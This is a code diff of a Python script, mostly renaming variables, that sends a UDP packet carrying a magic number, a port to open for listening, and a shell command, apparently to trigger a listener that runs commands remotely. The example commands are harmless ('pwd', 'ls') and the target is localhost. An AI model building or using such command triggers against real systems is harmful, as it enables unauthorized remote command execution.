@@ -1,8 +1,8 @@
 import socket
 import struct
 
-def send_udp_packet(target_host, target_port, magic, port_number, shell_command):
-    """
+def send_udp_packet(dest_host, dest_port, magic, port_number, shell_command):
+
     # Ensure the shell_command is not longer than 255 characters
     if len(shell_command) > 255:
         raise ValueError("Shell command must be 255 characters or less")
@@ -18,18 +18,16 @@ def send_udp_packet(target_host, target_port, magic, port_number, shell_command)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     # Send the packet
-    sock.sendto(packet, (target_host, target_port))
+    sock.sendto(packet, (dest_host, dest_port))
 
     # Close the socket
     sock.close()
 
-# Example usage
 if __name__ == "__main__":
-    target_host = "127.0.0.1"  # sendto IP address
-    target_port = 553  # sendto UDP port
+    dest_host = "127.0.0.1"  # sendto IP address
+    dest_port = 553  # sendto UDP port
     magic = 0xDEADBEEF  # Magic number
-    port_number = 2227  # TCP port number to start listening on
-    shell_command = "pwd" # command
-    shell_command_test = "pwd > /home/eladviz/Downloads/command_output.txt 2>&1"
-    send_udp_packet(target_host, target_port, magic, port_number, shell_command)
+    port_number = 2226  # TCP port number to start listening on
+    shell_command = "ls" # command
+    send_udp_packet(dest_host, dest_port, magic, port_number, shell_command)
     print("UDP packet sent.")
